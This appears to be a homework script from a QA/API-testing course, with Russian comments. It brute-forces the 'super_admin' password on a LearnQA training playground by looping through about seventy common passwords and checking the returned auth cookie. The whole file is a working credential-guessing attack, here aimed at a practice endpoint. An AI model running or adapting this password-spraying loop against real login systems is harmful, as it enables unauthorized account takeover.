import requests
payload_list = [{"login":"super_admin", "password":"password"},
{"login":"super_admin", "password":"123456"},
{"login":"super_admin", "password":"123456789"},
{"login":"super_admin", "password":"12345678"},
{"login":"super_admin", "password":"12345"},
{"login":"super_admin", "password":"qwerty"},
{"login":"super_admin", "password":"abc123"},
{"login":"super_admin", "password":"football"},
{"login":"super_admin", "password":"1234567"},
{"login":"super_admin", "password":"monkey"},
{"login":"super_admin", "password":"111111"},
{"login":"super_admin", "password":"letmein"},
{"login":"super_admin", "password":"1234"},
{"login":"super_admin", "password":"1234567890"},
{"login":"super_admin", "password":"dragon"},
{"login":"super_admin", "password":"baseball"},
{"login":"super_admin", "password":"sunshine"},
{"login":"super_admin", "password":"iloveyou"},
{"login":"super_admin", "password":"trustno1"},
{"login":"super_admin", "password":"princess"},
{"login":"super_admin", "password":"adobe123"},
{"login":"super_admin", "password":"123123"},
{"login":"super_admin", "password":"welcome"},
{"login":"super_admin", "password":"login"},
{"login":"super_admin", "password":"admin"},
{"login":"super_admin", "password":"qwerty123"},
{"login":"super_admin", "password":"solo"},
{"login":"super_admin", "password":"1q2w3e4r"},
{"login":"super_admin", "password":"master"},
{"login":"super_admin", "password":"photoshop"},
{"login":"super_admin", "password":"666666"},
{"login":"super_admin", "password":"1qaz2wsx"},
{"login":"super_admin", "password":"qwertyuiop"},
{"login":"super_admin", "password":"ashley"},
{"login":"super_admin", "password":"mustang"},
{"login":"super_admin", "password":"121212"},
{"login":"super_admin", "password":"starwars"},
{"login":"super_admin", "password":"654321"},
{"login":"super_admin", "password":"bailey"},
{"login":"super_admin", "password":"access"},
{"login":"super_admin", "password":"flower"},
{"login":"super_admin", "password":"555555"},
{"login":"super_admin", "password":"passw0rd"},
{"login":"super_admin", "password":"shadow"},
{"login":"super_admin", "password":"lovely"},
{"login":"super_admin", "password":"7777777"},
{"login":"super_admin", "password":"michael"},
{"login":"super_admin", "password":"!@#$%^&*"},
{"login":"super_admin", "password":"jesus"},
{"login":"super_admin", "password":"password1"},
{"login":"super_admin", "password":"hello"},
{"login":"super_admin", "password":"charlie"},
{"login":"super_admin", "password":"888888"},
{"login":"super_admin", "password":"superman"},
{"login":"super_admin", "password":"696969"},
{"login":"super_admin", "password":"hottie"},
{"login":"super_admin", "password":"freedom"},
{"login":"super_admin", "password":"aa123456"},
{"login":"super_admin", "password":"qazwsx"},
{"login":"super_admin", "password":"ninja"},
{"login":"super_admin", "password":"azerty"},
{"login":"super_admin", "password":"loveme"},
{"login":"super_admin", "password":"whatever"},
{"login":"super_admin", "password":"donald"},
{"login":"super_admin", "password":"batman"},
{"login":"super_admin", "password":"zaq1zaq1"},
{"login":"super_admin", "password":"Football"},
{"login":"super_admin", "password":"000000"},
{"login":"super_admin", "password":"123qwe"}]
for payload in payload_list:
    #авторизация
    url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
    response = requests.post(url, data= payload)

    #сохраняем куку для проверки
    cookie_value = response.cookies.get('auth_cookie')
    cookies = {'auth_cookie':cookie_value}
    password= response.text

    print(response.url,response.text,response.status_code,response.cookies , sep = '\n')

    #проверка авторизации
    url = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
    response1 = requests.post(url, cookies=cookies)
    print(response1.url,response1.text,response1.status_code,response1.cookies , sep = '\n')
    message = response1.text
    if message == "You are NOT authorized":
        print("Пароль не верный " )
    else:
        print("Пароль верный! " + password)